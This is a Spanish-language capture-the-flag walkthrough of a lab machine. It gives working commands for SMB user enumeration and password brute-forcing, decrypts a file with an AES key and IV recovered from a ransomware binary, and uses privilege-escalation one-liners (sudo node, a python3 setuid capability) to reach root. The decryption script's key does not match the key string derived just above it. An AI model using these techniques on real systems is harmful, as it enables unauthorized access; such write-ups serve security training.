## Reconocimiento:

Puerto 22 : SSH

Puerto 139 y 445 : Samba 

Hago un escaneo y fuerza bruta tradicional:

```bash
enum4linux -U 172.17.0.2
```

Encuentro 3 usuarios y los pongo en un archivo txt para hacer fuerza bruta:

```bash
crackmapexec smb 172.17.0.2 -r users.txt -p /usr/share/wordlists/rockyou.txt |grep -v 'STATUS_LOGON_FAILURE'
# Info:
patricio:basketball
```

Veo los recursos compartidos:

```bash
smbclient //172.17.0.2/ransomware -U patricio%basketball
```

Encuentro dos archivos llamados “private.txt” y “pokemongo” y los paso a mi maquina. Veo que “private.txt” está encriptado y toca encontrar como, para eso uso Ghidra para examinar “pokemongo”.

Explicación Técnica:

Al ir hasta la funcion `encrypt` puedo ver que hace uso de `AES-256-CBC`, dicho algoritmo necesita para el cifrado y descifrado una `key` y un vector de inicialización `IV` donde la `key` debe ser de 32 byte y el `IV` debe ser de 16 byte, si esta información se encuentra en el binario seria posible localizarlos y llegar a desencriptar los archivos, en caso de que estos valores sean cargados desde el 
exterior habría que analizar desde donde los obtiene y si es posible conseguirlos.

Analizando este fragmento de código en la función `main`, veo que el binario realiza varias comprobaciones para continuar, por lo que pinta es un ataque dirigido, si continuamos analizando el codigo un poco mas abajo se observan 2 variables `local_438` & `local_430` que si paso sus valores de hex a char queda:

`local_438 = 87654321` & `local_430 = 65432109` si las concateno quedaría `1234567890123456` (recordemos que debe revertirse el orden) y casualmente esto cumple con el `IV` que debe ser de 16 byte (el motivo por el cual uno el valor de estas 2 variables es porque se almacenan en direcciones de memoria una tras la otra con una separación de 8 bytes), podría ser el `IV` mas aun no es seguro, así que continuo chequeando y después observo una función llamada `recon`

Extrayendo la información en el mismo orden que es presentada obtenemos:

```
pq0y bxjf d 40977 e929 w f3daqmo0 csg4 l
```

Sin embargo recordemos que esta información se almacena invertida por lo que debemos revertirlo

```
y0qp fjxb d 77904 929e w 0omqad3f 4gsc l
```

Un detalle que observamos aquí es que esta cadena cumple con que la `key` debe ser de 32 byte

```
cadena de 32 byte presumiblemente la key
y0qpfjxbd77904929ew0omqad3f4gscl
```

Teniendo presuntamente el valor `key` y el valor `IV` creare un script en python para intentar desencriptar el archivo `private.txt`

Antes creo un entorno virtual e instalo dependencias para ejecutarlo:

```bash
source ../myenv/bin/activate
pip install pycryptodome
```

Y lo ejecuto:

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# key & IV presumibles 
key = b'y0qpfjxbd79047929ew0omqad3f4gscl'
iv = b'1234567890123456'

# Leo el archivo encriptado
with open('private.txt', 'rb') as f:
    encrypted_data = f.read()

# Creo un objeto cifrador
cipher = AES.new(key, AES.MODE_CBC, iv)

# Desencripto los datos
try:
    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
    # Guardar los datos desencriptados en un archivo
    with open('decrypted_file.bin', 'wb') as f:
        f.write(decrypted_data)
    print("Desencriptación completada con éxito.")
except ValueError as e:
    print(f"Error al desencriptar los datos: {e}")
```

Leo el archivo:

```bash
cat decrypted_file.bin
# Info:
bob:56000nmqpL
```

## Escalada bob → calamardo

```bash
sudo -l
(calamardo) NOPASSWD: /bin/node
```

Gracias GTFO Bins:

```bash
sudo -u calamardo /bin/node -e 'require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]})'
```

## Escalada calamardo → patricio

Leyendo el archivo “.bashrc” están escondidas las credenciales de Patricio:

```bash
patricio:Jap0n16ydcbd***
```

## Escalada patricio → root

```bash
ls -la /home/patricio
```

Encuentro el binario python3 y no debería de estar ahí, así que veo capacidades:

```bash
getcap .ssh/python3
.ssh/python3 cap_setuid=ep
```

Otra vez GTFO Bins al rescate:

```python
.ssh/python3 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

Listo.
